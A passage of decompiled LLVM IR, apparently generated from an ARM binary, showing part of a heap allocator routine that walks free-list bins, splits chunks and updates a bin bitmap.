  br i1 %v9_11938, label %dec_label_pc_11ac4, label %dec_label_pc_11940

dec_label_pc_11940:                               ; preds = %dec_label_pc_1191c
  %v2_11940 = add i32 %v3_11934, %v0_118ec
  store i32 %v2_11940, i32* %r3.global-to-local, align 4
  %v1_11944 = add i32 %v2_11940, 4
  %v2_11944 = inttoptr i32 %v1_11944 to i32*
  %v3_11944 = load i32, i32* %v2_11944, align 4
  store i32 %v3_11944, i32* %r2.global-to-local, align 4
  %v1_11948 = add i32 %v3_11934, 12
  %v2_11948 = inttoptr i32 %v1_11948 to i32*
  %v3_11948 = load i32, i32* %v2_11948, align 4
  store i32 %v3_11948, i32* %r1.global-to-local, align 4
  %v1_1194c = or i32 %v3_11944, 1
  store i32 %v1_1194c, i32* %r2.global-to-local, align 4
  %v1_11950 = add i32 %v3_11934, 8
  store i32 %v1_11950, i32* %r4.global-to-local, align 4
  store i32 %v1_1194c, i32* %v2_11944, align 4
  %v0_11958 = load i32, i32* %ip.global-to-local, align 4
  %v1_11958 = load i32, i32* %r1.global-to-local, align 4
  %v2_11958 = add i32 %v1_11958, 8
  %v3_11958 = inttoptr i32 %v2_11958 to i32*
  store i32 %v0_11958, i32* %v3_11958, align 4
  %v0_1195c = load i32, i32* %r1.global-to-local, align 4
  %v1_1195c = load i32, i32* %ip.global-to-local, align 4
  %v2_1195c = add i32 %v1_1195c, 12
  %v3_1195c = inttoptr i32 %v2_1195c to i32*
  store i32 %v0_1195c, i32* %v3_1195c, align 4
  br label %dec_label_pc_12114

dec_label_pc_11964:                               ; preds = %dec_label_pc_11914
  store i32 %v0_118ec, i32* %r0.global-to-local, align 4
  %v1_11968 = call i32 @function_117c4(i32 %v0_118ec)
  store i32 %v1_11968, i32* %r0.global-to-local, align 4
  %v0_1196c = load i32, i32* @r4, align 4
  %v1_1196c = and i32 %v0_1196c, 2
  %v2_1196c = icmp eq i32 %v1_1196c, 0
  store i32 %v1_11968, i32* @r7, align 4
  br i1 %v2_1196c, label %dec_label_pc_11ac4, label %dec_label_pc_11978

dec_label_pc_11978:                               ; preds = %dec_label_pc_11964
  store i32 32, i32* %r3.global-to-local, align 4
  store i32 124820, i32* %r1.global-to-local, align 4
  %v4_11980 = load i32, i32* inttoptr (i32 124852 to i32*), align 4
  store i32 %v4_11980, i32* @r0, align 4
  %v0_11984 = call i32 @function_126f4()
  store i32 %v0_11984, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_11ac4

dec_label_pc_1198c:                               ; preds = %dec_label_pc_11ad8
  %v1_1198c = add i32 %v3_11ad8, 4
  %v2_1198c = inttoptr i32 %v1_1198c to i32*
  %v3_1198c = load i32, i32* %v2_1198c, align 4
  store i32 %v3_1198c, i32* %r3.global-to-local, align 4
  %v0_11990 = load i32, i32* @sl, align 4
  %v1_11994 = and i32 %v3_1198c, -4
  store i32 %v1_11994, i32* %r4.global-to-local, align 4
  %v1_11998 = add i32 %v3_11ad8, 12
  %v2_11998 = inttoptr i32 %v1_11998 to i32*
  %v3_11998 = load i32, i32* %v2_11998, align 4
  store i32 %v3_11998, i32* %ip.global-to-local, align 4
  %tmp203 = icmp ugt i32 %v0_11990, 255
  br i1 %tmp203, label %dec_label_pc_119f4, label %dec_label_pc_119a0

dec_label_pc_119a0:                               ; preds = %dec_label_pc_1198c
  %v9_119a0 = icmp eq i32 %v3_11998, %v0_119f8
  br i1 %v9_119a0, label %dec_label_pc_119a8, label %dec_label_pc_119f4

dec_label_pc_119a8:                               ; preds = %dec_label_pc_119a0
  %v0_119a8 = load i32, i32* @sb, align 4
  %v1_119a8 = add i32 %v0_119a8, 48
  %v2_119a8 = inttoptr i32 %v1_119a8 to i32*
  %v3_119a8 = load i32, i32* %v2_119a8, align 4
  store i32 %v3_119a8, i32* %r3.global-to-local, align 4
  %v9_119ac = icmp eq i32 %v3_11ad8, %v3_119a8
  br i1 %v9_119ac, label %dec_label_pc_119b4, label %dec_label_pc_119f4

dec_label_pc_119b4:                               ; preds = %dec_label_pc_119a8
  %v1_119b4 = load i32, i32* @fp, align 4
  %tmp204 = icmp ugt i32 %v1_11994, %v1_119b4
  br i1 %tmp204, label %dec_label_pc_119bc, label %dec_label_pc_119f4

dec_label_pc_119bc:                               ; preds = %dec_label_pc_119b4
  %v2_119bc = sub i32 %v1_11994, %v0_11990
  store i32 %v2_119bc, i32* %r2.global-to-local, align 4
  %v2_119c0 = add i32 %v0_11990, %v3_11ad8
  store i32 %v2_119c0, i32* %r3.global-to-local, align 4
  %v1_119c4 = or i32 %v0_11990, 1
  store i32 %v1_119c4, i32* %r0.global-to-local, align 4
  %v1_119c8 = or i32 %v2_119bc, 1
  store i32 %v1_119c8, i32* %r1.global-to-local, align 4
  %v1_119cc = add i32 %v3_11ad8, 8
  store i32 %v1_119cc, i32* %r4.global-to-local, align 4
  %v2_119d0 = add i32 %v0_119f8, 8
  %v3_119d0 = inttoptr i32 %v2_119d0 to i32*
  store i32 %v2_119c0, i32* %v3_119d0, align 4
  %v0_119d4 = load i32, i32* %r3.global-to-local, align 4
  %v1_119d4 = load i32, i32* %ip.global-to-local, align 4
  %v2_119d4 = add i32 %v1_119d4, 12
  %v3_119d4 = inttoptr i32 %v2_119d4 to i32*
  store i32 %v0_119d4, i32* %v3_119d4, align 4
  %v0_119d8 = load i32, i32* %r0.global-to-local, align 4
  %v1_119d8 = load i32, i32* @r6, align 4
  %v2_119d8 = add i32 %v1_119d8, 4
  %v3_119d8 = inttoptr i32 %v2_119d8 to i32*
  store i32 %v0_119d8, i32* %v3_119d8, align 4
  %v0_119dc = load i32, i32* %r3.global-to-local, align 4
  %v1_119dc = load i32, i32* @sb, align 4
  %v2_119dc = add i32 %v1_119dc, 48
  %v3_119dc = inttoptr i32 %v2_119dc to i32*
  store i32 %v0_119dc, i32* %v3_119dc, align 4
  %v0_119e0 = load i32, i32* %r2.global-to-local, align 4
  %v1_119e0 = load i32, i32* %r3.global-to-local, align 4
  %v3_119e0 = add i32 %v1_119e0, %v0_119e0
  %v4_119e0 = inttoptr i32 %v3_119e0 to i32*
  store i32 %v0_119e0, i32* %v4_119e0, align 4
  %v0_119e4 = load i32, i32* %r1.global-to-local, align 4
  %v1_119e4 = load i32, i32* %r3.global-to-local, align 4
  %v2_119e4 = add i32 %v1_119e4, 4
  %v3_119e4 = inttoptr i32 %v2_119e4 to i32*
  store i32 %v0_119e4, i32* %v3_119e4, align 4
  %v0_119e8 = load i32, i32* %ip.global-to-local, align 4
  %v1_119e8 = load i32, i32* %r3.global-to-local, align 4
  %v2_119e8 = add i32 %v1_119e8, 12
  %v3_119e8 = inttoptr i32 %v2_119e8 to i32*
  store i32 %v0_119e8, i32* %v3_119e8, align 4
  %v0_119ec = load i32, i32* %ip.global-to-local, align 4
  %v1_119ec = load i32, i32* %r3.global-to-local, align 4
  %v2_119ec = add i32 %v1_119ec, 8
  %v3_119ec = inttoptr i32 %v2_119ec to i32*
  store i32 %v0_119ec, i32* %v3_119ec, align 4
  br label %dec_label_pc_12114

dec_label_pc_119f4:                               ; preds = %dec_label_pc_119b4, %dec_label_pc_119a8, %dec_label_pc_119a0, %dec_label_pc_1198c
  %v9_119f4 = icmp eq i32 %v1_11994, %v0_11990
  %v2_119f8 = add i32 %v3_11998, 8
  %v3_119f8 = inttoptr i32 %v2_119f8 to i32*
  store i32 %v0_119f8, i32* %v3_119f8, align 4
  %v0_119fc = load i32, i32* %ip.global-to-local, align 4
  %v1_119fc = load i32, i32* %r5.global-to-local, align 4
  %v2_119fc = add i32 %v1_119fc, 12
  %v3_119fc = inttoptr i32 %v2_119fc to i32*
  store i32 %v0_119fc, i32* %v3_119fc, align 4
  br i1 %v9_119f4, label %dec_label_pc_11b54.loopexit, label %dec_label_pc_11a10

dec_label_pc_11a10:                               ; preds = %dec_label_pc_119f4
  %v0_11a10 = load i32, i32* %r4.global-to-local, align 4
  %tmp205 = icmp ugt i32 %v0_11a10, 255
  br i1 %tmp205, label %dec_label_pc_11a34, label %dec_label_pc_11a18

dec_label_pc_11a18:                               ; preds = %dec_label_pc_11a10
  store i32 124820, i32* %r2.global-to-local, align 4
  %v1_11a1c = load i32, i32* %r8.global-to-local, align 4
  %v2_11a1c = add i32 %v1_11a1c, 124820
  %v3_11a1c = inttoptr i32 %v2_11a1c to i32*
  %v4_11a1c = load i32, i32* %v3_11a1c, align 4
  %v3_11a20 = udiv i32 %v0_11a10, 8
  store i32 %v3_11a20, i32* %r0.global-to-local, align 4
  %v4_11a24 = mul nuw i32 %v3_11a20, 8
  %v5_11a24 = add i32 %v4_11a1c, %v4_11a24
  store i32 %v5_11a24, i32* %r3.global-to-local, align 4
  %v1_11a28 = add i32 %v5_11a24, 44
  store i32 %v1_11a28, i32* %ip.global-to-local, align 4
  %v1_11a2c = add i32 %v5_11a24, 52
  %v2_11a2c = inttoptr i32 %v1_11a2c to i32*
  %v3_11a2c = load i32, i32* %v2_11a2c, align 4
  store i32 %v3_11a2c, i32* @lr, align 4
  br label %dec_label_pc_11a8c

dec_label_pc_11a34:                               ; preds = %dec_label_pc_11a10
  store i32 %v0_11a10, i32* %r0.global-to-local, align 4
  %v1_11a38 = call i32 @function_117c4(i32 %v0_11a10)
  store i32 %v1_11a38, i32* %r0.global-to-local, align 4
  store i32 124820, i32* %ip.global-to-local, align 4
  %v1_11a40 = load i32, i32* %r8.global-to-local, align 4
  %v2_11a40 = add i32 %v1_11a40, 124820
  %v3_11a40 = inttoptr i32 %v2_11a40 to i32*
  %v4_11a40 = load i32, i32* %v3_11a40, align 4
  %v4_11a44 = mul i32 %v1_11a38, 8
  %v5_11a44 = add i32 %v4_11a40, %v4_11a44
  store i32 %v5_11a44, i32* %r3.global-to-local, align 4
  %v1_11a48 = add i32 %v5_11a44, 44
  store i32 %v1_11a48, i32* %ip.global-to-local, align 4
  %v1_11a4c = add i32 %v5_11a44, 52
  %v2_11a4c = inttoptr i32 %v1_11a4c to i32*
  %v3_11a4c = load i32, i32* %v2_11a4c, align 4
  store i32 %v3_11a4c, i32* @lr, align 4
  %v9_11a50 = icmp eq i32 %v3_11a4c, %v1_11a48
  br i1 %v9_11a50, label %dec_label_pc_11a8c, label %dec_label_pc_11a58

dec_label_pc_11a58:                               ; preds = %dec_label_pc_11a34
  %v1_11a58 = add i32 %v5_11a44, 56
  %v2_11a58 = inttoptr i32 %v1_11a58 to i32*
  %v3_11a58 = load i32, i32* %v2_11a58, align 4
  store i32 %v3_11a58, i32* %r1.global-to-local, align 4
  %v1_11a5c = add i32 %v3_11a58, 4
  %v2_11a5c = inttoptr i32 %v1_11a5c to i32*
  %v3_11a5c = load i32, i32* %v2_11a5c, align 4
  store i32 %v3_11a5c, i32* %r3.global-to-local, align 4
  %v0_11a60 = load i32, i32* %r4.global-to-local, align 4
  %v3_11a60 = icmp ult i32 %v0_11a60, %v3_11a5c
  br i1 %v3_11a60, label %.thread, label %dec_label_pc_11a7c.preheader

.thread:                                          ; preds = %dec_label_pc_11a58
  store i32 %v1_11a48, i32* @lr, align 4
  store i32 %v3_11a58, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_11a8c

dec_label_pc_11a7c.preheader:                     ; preds = %dec_label_pc_11a58
  %v2_11a68 = or i32 %v0_11a60, 1
  store i32 %v2_11a68, i32* %r2.global-to-local, align 4
  %v1_11a7c179 = add i32 %v3_11a4c, 4
  %v2_11a7c180 = inttoptr i32 %v1_11a7c179 to i32*
  %v3_11a7c181 = load i32, i32* %v2_11a7c180, align 4
  store i32 %v3_11a7c181, i32* %r3.global-to-local, align 4
  %v3_11a80183 = icmp ult i32 %v2_11a68, %v3_11a7c181
  br i1 %v3_11a80183, label %dec_label_pc_11a78, label %dec_label_pc_11a88

dec_label_pc_11a78:                               ; preds = %dec_label_pc_11a7c.preheader, %dec_label_pc_11a78
  %v0_11a88184 = phi i32 [ %v3_11a78, %dec_label_pc_11a78 ], [ %v3_11a4c, %dec_label_pc_11a7c.preheader ]
  %v1_11a78 = add i32 %v0_11a88184, 8
  %v2_11a78 = inttoptr i32 %v1_11a78 to i32*
  %v3_11a78 = load i32, i32* %v2_11a78, align 4
  store i32 %v3_11a78, i32* @lr, align 4
  %v1_11a7c = add i32 %v3_11a78, 4
  %v2_11a7c = inttoptr i32 %v1_11a7c to i32*
  %v3_11a7c = load i32, i32* %v2_11a7c, align 4
  store i32 %v3_11a7c, i32* %r3.global-to-local, align 4
  %v3_11a80 = icmp ult i32 %v2_11a68, %v3_11a7c
  br i1 %v3_11a80, label %dec_label_pc_11a78, label %dec_label_pc_11a88

dec_label_pc_11a88:                               ; preds = %dec_label_pc_11a78, %dec_label_pc_11a7c.preheader
  %v0_11a88.lcssa = phi i32 [ %v3_11a4c, %dec_label_pc_11a7c.preheader ], [ %v3_11a78, %dec_label_pc_11a78 ]
  %v1_11a88 = add i32 %v0_11a88.lcssa, 12
  %v2_11a88 = inttoptr i32 %v1_11a88 to i32*
  %v3_11a88 = load i32, i32* %v2_11a88, align 4
  store i32 %v3_11a88, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_11a8c

dec_label_pc_11a8c:                               ; preds = %.thread, %dec_label_pc_11a34, %dec_label_pc_11a18, %dec_label_pc_11a88
  %v0_11aac = phi i32 [ %v1_11a48, %dec_label_pc_11a34 ], [ %v1_11a28, %dec_label_pc_11a18 ], [ %v3_11a88, %dec_label_pc_11a88 ], [ %v3_11a58, %.thread ]
  %v0_11aa0 = phi i32 [ %v1_11a38, %dec_label_pc_11a34 ], [ %v3_11a20, %dec_label_pc_11a18 ], [ %v1_11a38, %dec_label_pc_11a88 ], [ %v1_11a38, %.thread ]
  %v1_11a90 = phi i32 [ %v1_11a40, %dec_label_pc_11a34 ], [ %v1_11a1c, %dec_label_pc_11a18 ], [ %v1_11a40, %dec_label_pc_11a88 ], [ %v1_11a40, %.thread ]
  store i32 124820, i32* %r2.global-to-local, align 4
  %v2_11a90 = add i32 %v1_11a90, 124820
  %v3_11a90 = inttoptr i32 %v2_11a90 to i32*
  %v4_11a90 = load i32, i32* %v3_11a90, align 4
  %v3_11a94 = sdiv i32 %v0_11aa0, 32
  store i32 %v3_11a94, i32* %r3.global-to-local, align 4
  %v4_11a98 = mul nsw i32 %v3_11a94, 4
  %v5_11a98 = add i32 %v4_11a90, %v4_11a98
  store i32 %v5_11a98, i32* %r1.global-to-local, align 4
  %v1_11a9c = add i32 %v5_11a98, 820
  %v2_11a9c = inttoptr i32 %v1_11a9c to i32*
  %v3_11a9c = load i32, i32* %v2_11a9c, align 4
  %v1_11aa0 = urem i32 %v0_11aa0, 32
  store i32 %v1_11aa0, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r0.global-to-local, align 4
  %v7_11aa8 = shl i32 1, %v1_11aa0
  %v8_11aa8 = or i32 %v3_11a9c, %v7_11aa8
  store i32 %v8_11aa8, i32* %r3.global-to-local, align 4
  %v1_11aac = load i32, i32* @r6, align 4
  %v2_11aac = add i32 %v1_11aac, 12
  %v3_11aac = inttoptr i32 %v2_11aac to i32*
  store i32 %v0_11aac, i32* %v3_11aac, align 4
  %v0_11ab0 = load i32, i32* @lr, align 4
  %v1_11ab0 = load i32, i32* @r6, align 4
  %v2_11ab0 = add i32 %v1_11ab0, 8
  %v3_11ab0 = inttoptr i32 %v2_11ab0 to i32*
  store i32 %v0_11ab0, i32* %v3_11ab0, align 4
  %v0_11ab4 = load i32, i32* %r3.global-to-local, align 4
  %v1_11ab4 = load i32, i32* %r1.global-to-local, align 4
  %v2_11ab4 = add i32 %v1_11ab4, 820
  %v3_11ab4 = inttoptr i32 %v2_11ab4 to i32*
  store i32 %v0_11ab4, i32* %v3_11ab4, align 4
  %v0_11ab8 = load i32, i32* @r6, align 4
  %v1_11ab8 = load i32, i32* @lr, align 4
  %v2_11ab8 = add i32 %v1_11ab8, 12
  %v3_11ab8 = inttoptr i32 %v2_11ab8 to i32*
  store i32 %v0_11ab8, i32* %v3_11ab8, align 4
  %v0_11abc = load i32, i32* @r6, align 4
  %v1_11abc = load i32, i32* %ip.global-to-local, align 4
  %v2_11abc = add i32 %v1_11abc, 8
  %v3_11abc = inttoptr i32 %v2_11abc to i32*
  store i32 %v0_11abc, i32* %v3_11abc, align 4
  %v0_11ad8.pre = load i32, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_11ad8

dec_label_pc_11ac4:                               ; preds = %dec_label_pc_11964, %dec_label_pc_1191c, %dec_label_pc_11978
  store i32 32, i32* %r8.global-to-local, align 4
  store i32 124820, i32* %r1.global-to-local, align 4
  %v4_11acc = load i32, i32* inttoptr (i32 124852 to i32*), align 4
  store i32 %v4_11acc, i32* @sb, align 4
  %v0_11ad0 = load i32, i32* @sl, align 4
  %v1_11ad0 = add i32 %v0_11ad0, 16
  store i32 %v1_11ad0, i32* @fp, align 4
  %v1_11ad4 = add i32 %v4_11acc, 52
  store i32 %v1_11ad4, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_11ad8

dec_label_pc_11ad8:                               ; preds = %dec_label_pc_11a8c, %dec_label_pc_11ac4
  %v0_119f8 = phi i32 [ %v0_11ad8.pre, %dec_label_pc_11a8c ], [ %v1_11ad4, %dec_label_pc_11ac4 ]
  %v1_11ad8 = add i32 %v0_119f8, 12
  %v2_11ad8 = inttoptr i32 %v1_11ad8 to i32*
  %v3_11ad8 = load i32, i32* %v2_11ad8, align 4
  store i32 %v3_11ad8, i32* @r6, align 4
  %v9_11adc = icmp eq i32 %v3_11ad8, %v0_119f8
  br i1 %v9_11adc, label %dec_label_pc_11ae4, label %dec_label_pc_1198c

dec_label_pc_11ae4:                               ; preds = %dec_label_pc_11ad8
  %v0_11ae4 = load i32, i32* @sl, align 4
  %tmp206 = icmp ult i32 %v0_11ae4, 256
  %v0_11b9c.pre = load i32, i32* @r7, align 4
  br i1 %tmp206, label %dec_label_pc_11ae4.dec_label_pc_11b9c_crit_edge, label %dec_label_pc_11aec

dec_label_pc_11ae4.dec_label_pc_11b9c_crit_edge:  ; preds = %dec_label_pc_11ae4
  %.pre200 = mul i32 %v0_11b9c.pre, 8
  br label %dec_label_pc_11b9c

dec_label_pc_11aec:                               ; preds = %dec_label_pc_11ae4
  %v4_11aec = mul i32 %v0_11b9c.pre, 8
  %v5_11aec = add i32 %v4_11aec, %v0_119f8
  store i32 %v5_11aec, i32* %r3.global-to-local, align 4
  %v1_11af0 = add i32 %v5_11aec, -8
  store i32 %v1_11af0, i32* %r1.global-to-local, align 4
  %v1_11af4 = add i32 %v5_11aec, 4
  %v2_11af4 = inttoptr i32 %v1_11af4 to i32*
  %storemerge.pre = load i32, i32* %v2_11af4, align 4
  br label %dec_label_pc_11b94

dec_label_pc_11afc:                               ; preds = %dec_label_pc_11b94
  %v1_11afc = add i32 %v1_11b24, 4
  %v2_11afc = inttoptr i32 %v1_11afc to i32*
  %v3_11afc = load i32, i32* %v2_11afc, align 4
  store i32 %v3_11afc, i32* %r3.global-to-local, align 4
  %v1_11b00 = and i32 %v3_11afc, -4
  store i32 %v1_11b00, i32* %r2.global-to-local, align 4
  %v3_11b04 = icmp ult i32 %v1_11b00, %v0_11ae4
  %v1_11b08 = add i32 %v1_11b24, 12
  %v2_11b08 = inttoptr i32 %v1_11b08 to i32*
  %v3_11b08 = load i32, i32* %v2_11b08, align 4
  store i32 %v3_11b08, i32* %r0.global-to-local, align 4
  br i1 %v3_11b04, label %dec_label_pc_11b94, label %dec_label_pc_11b10

dec_label_pc_11b10:                               ; preds = %dec_label_pc_11afc
  %v1_11b10 = add i32 %v1_11b24, 8
  %v2_11b10 = inttoptr i32 %v1_11b10 to i32*
  %v3_11b10 = load i32, i32* %v2_11b10, align 4
  store i32 %v3_11b10, i32* %r1.global-to-local, align 4
  %v1_11b14 = add i32 %v3_11b10, 12
  %v2_11b14 = inttoptr i32 %v1_11b14 to i32*
  %v3_11b14 = load i32, i32* %v2_11b14, align 4
  store i32 %v3_11b14, i32* %r3.global-to-local, align 4
  %v9_11b18 = icmp eq i32 %v3_11b14, %v1_11b24
  br i1 %v9_11b18, label %dec_label_pc_11b20, label %dec_label_pc_11b2c

dec_label_pc_11b20:                               ; preds = %dec_label_pc_11b10
  %v1_11b20 = add i32 %v3_11b08, 8
  %v2_11b20 = inttoptr i32 %v1_11b20 to i32*
  %v3_11b20 = load i32, i32* %v2_11b20, align 4
  store i32 %v3_11b20, i32* %r3.global-to-local, align 4
  %v9_11b24 = icmp eq i32 %v3_11b20, %v1_11b24
  br i1 %v9_11b24, label %dec_label_pc_11b30, label %dec_label_pc_11b2c

dec_label_pc_11b2c:                               ; preds = %dec_label_pc_11b10, %dec_label_pc_11b20
  %v0_11b2c = call i32 @function_12b24()
  store i32 %v0_11b2c, i32* %r0.global-to-local, align 4
  %v0_11b30.pre = load i32, i32* @sl, align 4
  %v1_11b30.pre = load i32, i32* @r2, align 4
  %v0_11b38.pre = load i32, i32* @r1, align 4
  br label %dec_label_pc_11b30

dec_label_pc_11b30:                               ; preds = %dec_label_pc_11b20, %dec_label_pc_11b2c
  %v1_11b38 = phi i32 [ %v3_11b08, %dec_label_pc_11b20 ], [ %v0_11b2c, %dec_label_pc_11b2c ]
  %v0_11b38 = phi i32 [ %v3_11b10, %dec_label_pc_11b20 ], [ %v0_11b38.pre, %dec_label_pc_11b2c ]
  %v1_11b30 = phi i32 [ %v1_11b00, %dec_label_pc_11b20 ], [ %v1_11b30.pre, %dec_label_pc_11b2c ]
  %v0_11b30 = phi i32 [ %v0_11ae4, %dec_label_pc_11b20 ], [ %v0_11b30.pre, %dec_label_pc_11b2c ]
  %v2_11b30 = sub i32 %v1_11b30, %v0_11b30
  store i32 %v2_11b30, i32* %lr.global-to-local, align 4
  %v2_11b38 = add i32 %v1_11b38, 8
  %v3_11b38 = inttoptr i32 %v2_11b38 to i32*
  store i32 %v0_11b38, i32* %v3_11b38, align 4
  %v0_11b3c = load i32, i32* %r0.global-to-local, align 4
  %v1_11b3c = load i32, i32* %r1.global-to-local, align 4
  %v2_11b3c = add i32 %v1_11b3c, 12
  %v3_11b3c = inttoptr i32 %v2_11b3c to i32*
  store i32 %v0_11b3c, i32* %v3_11b3c, align 4
  %v0_11b40 = load i32, i32* %ip.global-to-local, align 4
  %v1_11b40 = add i32 %v0_11b40, 8
  store i32 %v1_11b40, i32* %r0.global-to-local, align 4
  %tmp207 = icmp ugt i32 %v2_11b30, 15
  br i1 %tmp207, label %dec_label_pc_11b60, label %dec_label_pc_11b48

dec_label_pc_11b48:                               ; preds = %dec_label_pc_11b30
  %v1_11b48 = load i32, i32* %r2.global-to-local, align 4
  %v2_11b48 = add i32 %v1_11b48, %v0_11b40
  store i32 %v2_11b48, i32* %r2.global-to-local, align 4
  %v1_11b4c = add i32 %v2_11b48, 4
  %v2_11b4c = inttoptr i32 %v1_11b4c to i32*
  %v3_11b4c = load i32, i32* %v2_11b4c, align 4
  store i32 %v3_11b4c, i32* %r3.global-to-local, align 4
  store i32 %v1_11b40, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_11b54

dec_label_pc_11b54.loopexit:                      ; preds = %dec_label_pc_119f4
  %v1_11a00 = load i32, i32* @r6, align 4
  %v2_11a00 = load i32, i32* @sl, align 4
  %v3_11a00 = add i32 %v2_11a00, %v1_11a00
  store i32 %v3_11a00, i32* %r2.global-to-local, align 4
  %v2_11a04 = add i32 %v3_11a00, 4
  %v3_11a04 = inttoptr i32 %v2_11a04 to i32*
  %v4_11a04 = load i32, i32* %v3_11a04, align 4
  store i32 %v4_11a04, i32* %r3.global-to-local, align 4
  %v2_11a08 = add i32 %v1_11a00, 8
  store i32 %v2_11a08, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_11b54

dec_label_pc_11b54:                               ; preds = %.dec_label_pc_11b54_crit_edge, %dec_label_pc_11b54.loopexit, %dec_label_pc_11b48
  %v1_11b58 = phi i32 [ %v4_11c7c, %.dec_label_pc_11b54_crit_edge ], [ %v3_11a00, %dec_label_pc_11b54.loopexit ], [ %v2_11b48, %dec_label_pc_11b48 ]
  %v0_11b54 = phi i32 [ %v7_11c7c, %.dec_label_pc_11b54_crit_edge ], [ %v4_11a04, %dec_label_pc_11b54.loopexit ], [ %v3_11b4c, %dec_label_pc_11b48 ]
  %v1_11b54 = or i32 %v0_11b54, 1
  store i32 %v1_11b54, i32* %r3.global-to-local, align 4
  %v2_11b58 = add i32 %v1_11b58, 4
  %v3_11b58 = inttoptr i32 %v2_11b58 to i32*
  store i32 %v1_11b54, i32* %v3_11b58, align 4
  br label %dec_label_pc_12114

dec_label_pc_11b60:                               ; preds = %dec_label_pc_11b30
  %v1_11b60 = load i32, i32* @sl, align 4
  %v2_11b60 = add i32 %v1_11b60, %v0_11b40
  store i32 %v2_11b60, i32* %r2.global-to-local, align 4
  %v1_11b64 = or i32 %v1_11b60, 1
  store i32 %v1_11b64, i32* %r3.global-to-local, align 4
  %v0_11b68 = load i32, i32* %lr.global-to-local, align 4
  %v1_11b68 = or i32 %v0_11b68, 1
  store i32 %v1_11b68, i32* %r1.global-to-local, align 4
  store i32 %v1_11b40, i32* %r4.global-to-local, align 4
  %v2_11b70 = add i32 %v0_11b40, 4
  %v3_11b70 = inttoptr i32 %v2_11b70 to i32*
  store i32 %v1_11b64, i32* %v3_11b70, align 4
  %v0_11b74 = load i32, i32* %r2.global-to-local, align 4
  %v1_11b74 = load i32, i32* @r6, align 4
  %v2_11b74 = add i32 %v1_11b74, 8
  %v3_11b74 = inttoptr i32 %v2_11b74 to i32*
  store i32 %v0_11b74, i32* %v3_11b74, align 4
  %v0_11b78 = load i32, i32* %r2.global-to-local, align 4
  %v1_11b78 = load i32, i32* @r6, align 4
  %v2_11b78 = add i32 %v1_11b78, 12
  %v3_11b78 = inttoptr i32 %v2_11b78 to i32*
  store i32 %v0_11b78, i32* %v3_11b78, align 4
  %v0_11b7c = load i32, i32* %lr.global-to-local, align 4
  %v1_11b7c = load i32, i32* %r2.global-to-local, align 4
  %v3_11b7c = add i32 %v1_11b7c, %v0_11b7c
  %v4_11b7c = inttoptr i32 %v3_11b7c to i32*
  store i32 %v0_11b7c, i32* %v4_11b7c, align 4
  %v0_11b80 = load i32, i32* %r1.global-to-local, align 4
  %v1_11b80 = load i32, i32* %r2.global-to-local, align 4
  %v2_11b80 = add i32 %v1_11b80, 4
  %v3_11b80 = inttoptr i32 %v2_11b80 to i32*
  store i32 %v0_11b80, i32* %v3_11b80, align 4
  %v0_11b84 = load i32, i32* @r6, align 4
  %v1_11b84 = load i32, i32* %r2.global-to-local, align 4
  %v2_11b84 = add i32 %v1_11b84, 12
  %v3_11b84 = inttoptr i32 %v2_11b84 to i32*
  store i32 %v0_11b84, i32* %v3_11b84, align 4
  %v0_11b88 = load i32, i32* @r6, align 4
  %v1_11b88 = load i32, i32* %r2.global-to-local, align 4
  %v2_11b88 = add i32 %v1_11b88, 8
  %v3_11b88 = inttoptr i32 %v2_11b88 to i32*
  store i32 %v0_11b88, i32* %v3_11b88, align 4
  br label %dec_label_pc_12114

dec_label_pc_11b94:                               ; preds = %dec_label_pc_11afc, %dec_label_pc_11aec
  %v1_11b24 = phi i32 [ %storemerge.pre, %dec_label_pc_11aec ], [ %v3_11b08, %dec_label_pc_11afc ]
  store i32 %v1_11b24, i32* %ip.global-to-local, align 4
  %v9_11b94 = icmp eq i32 %v1_11b24, %v1_11af0
  br i1 %v9_11b94, label %dec_label_pc_11b9c.loopexit, label %dec_label_pc_11afc

dec_label_pc_11b9c.loopexit:                      ; preds = %dec_label_pc_11b94
  br label %dec_label_pc_11b9c

dec_label_pc_11b9c:                               ; preds = %dec_label_pc_11ae4.dec_label_pc_11b9c_crit_edge, %dec_label_pc_11b9c.loopexit
  %v4_11bcc.pre-phi = phi i32 [ %.pre200, %dec_label_pc_11ae4.dec_label_pc_11b9c_crit_edge ], [ %v4_11aec, %dec_label_pc_11b9c.loopexit ]
  %v1_11b9c = add i32 %v0_11b9c.pre, 1
  store i32 %v1_11b9c, i32* %r2.global-to-local, align 4
  %v1_11ba0 = urem i32 %v1_11b9c, 32
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 124820, i32* %r0.global-to-local, align 4
  %v6_11bac = shl i32 1, %v1_11ba0
  store i32 %v6_11bac, i32* %ip.global-to-local, align 4
  store i32 32, i32* %r3.global-to-local, align 4
  %v4_11bb4 = load i32, i32* inttoptr (i32 124852 to i32*), align 4
  store i32 %v4_11bb4, i32* %r3.global-to-local, align 4
  %v3_11bb8 = udiv i32 %v1_11b9c, 32
  store i32 %v3_11bb8, i32* @r5, align 4
  %v4_11bbc = mul nuw nsw i32 %v3_11bb8, 4
  %v5_11bbc = add i32 %v4_11bb4, %v4_11bbc
  store i32 %v5_11bbc, i32* %r2.global-to-local, align 4
  %v1_11bc0 = add i32 %v5_11bbc, 820
  %v2_11bc0 = inttoptr i32 %v1_11bc0 to i32*
  %v3_11bc0 = load i32, i32* %v2_11bc0, align 4
  store i32 %v3_11bc0, i32* @r4, align 4
  %v1_11bc4 = add i32 %v4_11bb4, 52
  store i32 %v1_11bc4, i32* %r3.global-to-local, align 4
  store i32 32, i32* @r8, align 4
  %v5_11bcc = add i32 %v1_11bc4, %v4_11bcc.pre-phi
  store i32 %v5_11bcc, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_11bd0

dec_label_pc_11bd0:                               ; preds = %dec_label_pc_11c38, %dec_label_pc_11b9c
  %v1_11bd8 = phi i32 [ %v1_11bd8.pre, %dec_label_pc_11c38 ], [ %v3_11bc0, %dec_label_pc_11b9c ]
  %v0_11bd8 = phi i32 [ %v0_11bd0.pre, %dec_label_pc_11c38 ], [ %v6_11bac, %dec_label_pc_11b9c ]
  %v1_11bd0 = sub i32 1, %v0_11bd8
